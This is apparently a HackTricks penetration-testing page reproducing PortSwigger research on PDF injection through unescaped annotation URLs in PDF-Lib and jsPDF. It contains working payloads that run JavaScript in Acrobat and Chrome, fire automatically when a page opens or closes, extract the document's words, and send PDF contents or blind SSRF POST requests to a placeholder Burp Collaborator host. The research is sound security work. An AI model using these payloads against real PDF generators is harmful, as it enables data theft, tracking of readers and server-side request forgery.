

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


**If your input is being reflected inside a PDF file, you can try to inject PDF data to execute JavaScript or steal the PDF content.**

The following information was taken from [**https://portswigger.net/research/portable-data-exfiltration**](https://portswigger.net/research/portable-data-exfiltration)

## PDF-Lib

This time, I was using [PDFLib](https://pdf-lib.js.org). I took some time to use the library to create an annotation and see if I could inject a closing parenthesis into the annotation URI - and it worked! The sample vulnerable code I used to generate the annotation code was:

`...`  \
`A: {`\
    `Type: 'Action',`\
    `S: 'URI',`\
    ``URI: PDFString.of(`injection)`),``\
  `}`\
  `})`\
`...`

[Full code:](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/pdf-lib/first-injection/test.js)

How did I know the injection was successful? The PDF would render correctly unless I injected a closing parenthesis. This proved that the closing parenthesis was breaking out of the string and causing invalid PDF code. Breaking the PDF was nice, but I needed to ensure I could execute JavaScript of course. I looked at the rendered PDF code and noticed the output was being encoded using the FlateDecode filter. I wrote a little script to deflate the block and the output of the annotation section looked like this:`<<`\
`/Type /Annot`\
`/Subtype /Link`\
`/Rect [ 50 746.89 320 711.89 ]`\
`/Border [ 0 0 2 ]`\
`/C [ 0 0 1 ]`\
`/A <<`\
`/Type /Action`\
`/S /URI`\
`/URI (injection))`\
`>>`\
`>>`

As you can clearly see, the injection string is closing the text boundary with a closing parenthesis, which leaves an existing closing parenthesis that causes the PDF to be rendered incorrectly:

![Screenshot showing an error dialog when loading the PDF](https://portswigger.net/cms/images/34/f4/3ed2-article-screenshot-showing-damaged-pdf.png)

Great, so I could break the rendering of the PDF, now what? I needed to come up with an injection that called some JavaScript - the alert(1) of PDF injection.

Just like how XSS vectors depend on the browser's parsing, PDF injection exploitability can depend on the PDF renderer. I decided to start by targeting Acrobat because I thought the vectors were less likely to work in Chrome. Two things I noticed: 1) You could inject additional annotation actions and 2) if you repair the existing closing parenthesis then the PDF would render. After some experimentation, I came up with a nice payload that injected an additional annotation action, executed JavaScript, and repaired the closing parenthesis:`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action>>/>>(`

First I break out of the parenthesis, then break out of the dictionary using >> before starting a new annotation dictionary. The /S/JavaScript makes the annotation JavaScript-based and the /JS is where the JavaScript is stored. Inside the parentheses is our actual JavaScript. Note that you don't have to escape the parentheses if they're balanced. Finally, I add the type of annotation, finish the dictionary, and repair the closing parenthesis. This was so cool; I could craft an injection that executed JavaScript but so what, right? You can execute JavaScript but you don't have access to the DOM, so you can't read cookies. Then James popped up and suggested stealing the contents of the PDF from the injection. I started looking at ways to get the contents of a PDF. In Acrobat, I discovered that you can use JavaScript to submit forms without any user interaction! Looking at the spec for the JavaScript API, it was pretty straightforward to modify the base injection and add some JavaScript that would send the entire contents of the PDF code to an external server in a POST request:`/blah)>>/A<</S/JavaScript/JS(app.alert(1);`\
`this.submitForm({`\
`cURL: 'https://your-id.burpcollaborator.net',cSubmitAs: 'PDF'}))`\
`/Type/Action>>/>>(`

The alert is not needed; I just added it to prove the injection was executing JavaScript.

Next, just for fun, I looked at stealing the contents of the PDF without using JavaScript. From the PDF specification, I found out that you can use an action called SubmitForm. I used this in the past when I constructed a PDF for a scan check in Burp Suite. It does exactly what the name implies. It also has a Flags entry in the dictionary to control what is submitted. The Flags dictionary key accepts a single integer value, but each individual setting is controlled by a binary bit. A good way to work with these settings is using the new binary literals in ES6. The binary literal should be 14 bits long because there are 14 flags in total. In the following example, all of the settings are disabled:`0b00000000000000`

To set a flag, you first need to look up its bit position (table 237 of the [PDF specification](https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000\_2008.pdf)). In this case, we want to set the SubmitPDF flag. As this is controlled by the 9th bit, you just need to count 9 bits from the right:`0b00000100000000`

If you evaluate this with JavaScript, this results in the decimal value 256. In other words, setting the Flags entry to 256 will enable the SubmitPDF flag, which causes the contents of the PDF to be sent when submitting the form. All we need to do is use the base injection we created earlier and modify it to call the SubmitForm action instead of JavaScript:`/blah)>>/A<</S/SubmitForm/Flags 256/F(`\
`https://your-id.burpcollaborator.net)`\
`/Type/Action>>/>>(`

## sPDF

Next I applied my methodology to another PDF library - [jsPDF](https://parall.ax/products/jspdf) - and found it was vulnerable too. Exploiting this library was quite fun because they have an API that can execute in the browser and will allow you to generate the PDF in real time as you type. I noticed that, like the PDP-Lib library, they forgot to escape parentheses inside annotation URLs. Here the url property was vulnerable:`doc.createAnnotation({bounds:`\
`{x:0,y:10,w:200,h:200},`\
``type:'link',url:`/input`});``\
`//vulnerable`

So I generated a PDF using their API and injected PDF code into the url property:

`var doc = new jsPDF();`\
`doc.text(20, 20, 'Hello world!');`\
`doc.addPage('a6','l');`\
`doc.createAnnotation({bounds:`\
`` {x:0,y:10,w:200,h:200},type:'link',url:` ``\
`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action/F 0/(`\
`` `}); ``

I reduced the vector by removing the type entries of the dictionary and the unneeded F entry. I then left a dangling parenthesis that would be closed by the existing one. Reducing the size of the injection is important because the web application you are injecting to might only allow a limited amount of characters.`/blah)>>/A<</S/JavaScript/JS(app.alert(1)`

I then worked out that it was possible to reduce the vector even further! Acrobat would allow a URI and a JavaScript entry within one annotation action and would happily execute the JavaScript:`/)/S/JavaScript/JS(app.alert(1)`

Further research revealed that you can also inject multiple annotations. This means that instead of just injecting an action, you could break out of the annotation and define your own rect coordinates to choose which section of the document would be clickable. Using this technique, I was able to make the entire document clickable. `/) >> >>`\
`<</Type /Annot /Subtype /Link /Rect [0.00 813.54 566.93 -298.27] /Border [0 0`\
`0] /A <</S/SubmitForm/Flags 0/F(https://your-id.burpcollaborator.net`

## Executing annotations without interaction

So far, the vectors I've demonstrated require a click to activate the action from the annotation. Typically, James asked the question "Can we execute automatically?". I looked through the PDF specification and noticed some interesting features of annotations:

"The **PV** and **PI** entries allow a distinction between pages that are open and pages that are visible. At any one time, only a single page is considered open in the viewer application, while more than one page may be visible, depending on the page layout."

We can add the PV entry to the dictionary and the annotation will fire on Acrobat automatically! Not only that, but we can also execute a payload automatically when the PDF document is closed using the PC entry. An attacker could track you when you open the PDF and close it.

Here's how to execute automatically from an annotation:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/)``\
`>> >>`\
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PV <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Auto execute');`

When you close the PDF, this annotation will fire:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >>``\
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PC <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Close me');`

## Chrome

I've talked a lot about Acrobat but what about PDFium (Chrome's PDF reader)? Chrome is tricky; the attack surface is much smaller as its JavaScript support is more limited than Acrobat's. The first thing I noticed was that JavaScript wasn't being executed in annotations at all, so my proof of concepts weren't working. In order to get the vectors working in Chrome, I needed to at least execute JavaScript inside annotations. First though, I decided to try and overwrite a URL in an annotation. This was pretty easy. I could use the base injection I came up with before and simply inject another action with a URI entry that would overwrite the existing URL:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/blah)>>/A<</S/URI/URI(https://portswigger.net)``\
``/Type/Action>>/F 0>>(`});``\
`doc.text(20, 20, 'Test text');`

This would navigate to portswigger.net when clicked. Then I moved on and tried different injections to call JavaScript, but this would fail every time. I thought it was impossible to do. I took a step back and tried to manually construct an entire PDF that would call JavaScript from a click in Chrome without an injection. When using an AcroForm button, Chrome would allow JavaScript execution, but the problem was it required references to parts of the PDF. I managed to craft an injection that would execute JavaScript from a click on JSPDF:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.825 0.8275 0.8275]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1))/Type/Action/F 4/DA(blah`});``\
`doc.text(20, 20, 'Click me test');`

As you can see, the above vector requires knowledge of the PDF structure. \[ 3 0 R] refers to a specific PDF object and if we were doing a blind PDF injection attack, we wouldn't know the structure of it. Still, the next stage is to try a form submission. We can use the submitForm function for this, and because the annotation requires a click, Chrome will allow it:`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.0 813.54 566.93 -298.27]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1);this.submitForm('https://your-id.burpcollaborator.net'))/Type/Action/F 4/DA(blah`

This works, but it's messy and requires knowledge of the PDF structure. We can reduce it a lot and remove the reliance on the PDF structure:`#) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0 0 889 792]/CA(Submit)>>/Rect [ 0 0 889 792]/Subtype/Widget/AP<</N <</Type/XObject/Subtype/Form>>>>/Parent <</Kids[ ]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(`\
    `app.alert(1)`\
    `)/Type/Action/F 4/DA(blah`\
``

There's still some code we can remove:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(A)>>/A<</S/JavaScript/JS(app.alert(1))/(`});``\
`doc.text(20, 20, 'Test text');`\
``

The code above breaks out of the annotation, creates a new one, and makes the entire page clickable. In order for the JavaScript to execute, we have to inject a button and give it any text using the "T" entry. We can then finally inject our JavaScript code using the JS entry in the dictionary. Executing JavaScript on Chrome is great. I never thought it would be possible when I started this research.

Next I looked at the submitForm function to steal the contents of the PDF. We know that we can call the function and it does contact an external server, as demonstrated in one of the examples above, but does it support the full Acrobat specification? I looked at the [source code of PDFium](https://github.com/PDFium/PDFium/blob/master/fpdfsdk/src/javascript/Document.cpp#L818) but the function doesn't support SubmitAsPDF :( You can see it supports FDF, but unfortunately this doesn't submit the contents of the PDF. I looked for other ways but I didn't know what objects were available. I took the same approach I did with Acrobat and wrote a fuzzer/enumerator to find interesting objects. Getting information out of Chrome was more difficult than Acrobat; I had to gather information in chunks before outputting it using the alert function. This was because the alert function truncated the string sent to it.`...`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>> <</Type/Annot/Rect[0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(a)>>/A<</S/JavaScript/JS(``\
`(function(){`\
`var obj = this,`\
    `data = '',`\
    `chunks = [],`\
    `counter = 0,`\
    `added = false, i, props = [];`\
    `for(i in obj) {`\
        `props.push(i);`\
    `}`\
`...`

[Full code](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/jsPDF/chrome/enumerator/test.js)

Inspecting the output of the enumerator, I tried calling various functions in the hope of making external requests or gathering information from the PDF. Eventually, I found a very interesting function called getPageNthWord, which could extract words from the PDF document, thereby allowing me to steal the contents. The function has a subtle bug where the first word sometimes will not be extracted. But for the most part, it will extract the majority of words:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>> <</Type/Annot/Rect[0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(a)>>/A<</S/JavaScript/JS(``\
`words = [];`\
`for(page=0;page<this.numPages;page++) {`\
    `for(wordPos=0;wordPos<this.getPageNumWords(page);wordPos++) {`\
        `word = this.getPageNthWord(page, wordPos, true);`\
        `words.push(word);`\
    `}`\
`}`\
`app.alert(words);`\
    `` `}); ``\
`doc.text(20, 20, 'Click me test');`\
`doc.text(20, 40, 'Abc Def');`\
`doc.text(20, 60, 'Some word');`\
``

I was pretty pleased with myself that I could steal the contents of the PDF on Chrome as I never thought this would be possible. Combining this with the submitForm vector would enable you to send the data to an external server. The only downside is that it requires a click. I wondered if you could get JavaScript execution without a click on Chrome. Looking at the PDF specification again, I noticed that there is another entry in the annotation dictionary called "E", which will execute the annotation when the mouse enters the annotation area - basically a mouseover event. Unfortunately, this does not count as user interaction to enable a form submission. So although you can execute JavaScript, you can't do anything with the data because you can't send it to an external server. If you can get Chrome to submit data with this event, please let me know because I'd be very interested to hear how. Anyway, here is the code to trigger a mouseover acton:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >>``\
``<</Type /Annot /Subtype /Widget /Parent<</FT/Btn/T(a)>> /Rect [0 0 900 900] /AA <</E <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Test');`\
``

## SSRF in PDFium/Acrobat

It's possible to send a POST request with PDFium/Acrobat to perform a SSRF attack. This would be a [blind SSRF](https://portswigger.net/web-security/ssrf/blind) since you can make a POST request but can't read the response. To construct a POST request, you can use the /parent dictionary key as demonstrated earlier to assign a form element to the annotation, enabling JavaScript execution. But instead of using a button like we did before, you can assign a text field (/Tx) with the parameter name (/T) and parameter value (/V) dictionary keys. Notice how you have to pass the parameter names you want to use to the submitForm function as an array:`#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Tx/T(foo)/V(bar)>>/A<</S/JavaScript/JS(`\
`app.alert(1);`\
`this.submitForm('https://aiws4u6uubgfdag94xvc5wbrfilc91.burpcollaborator.net', false, false, ['foo']);`\
`)/(`\
``

You can even send raw new lines, which could be useful when chaining other attacks such as [request smuggling](https://portswigger.net/web-security/request-smuggling). The result of the POST request can be seen in the following Collaborator request:

![Screen shot showing a Burp Collaborator request from a PDF](https://portswigger.net/cms/images/3f/61/fd38-article-ssrf-screenshot.png)

Finally, I want to finish with a hybrid Chrome and Acrobat PDF injection. The first part injects JavaScript into the existing annotation to execute JavaScript on Acrobat. The second part breaks out of the annotation and injects a new annotation that defines a new clickable area for Chrome. I use the Acroform trick again to inject a button so that the JavaScript will execute: `var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)/S/JavaScript/JS(app.alert(1))/Type/Action>> >> <</Type/Annot/Rect[0 0 900 700]/Subtype/Widget/Parent<</FT/Btn/T(a)>>/A<</S/JavaScript/JS(app.alert(1)`});``\
`doc.text(20, 20, 'Click me Acrobat');`\
`doc.text(20, 60, 'Click me Chrome');`


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


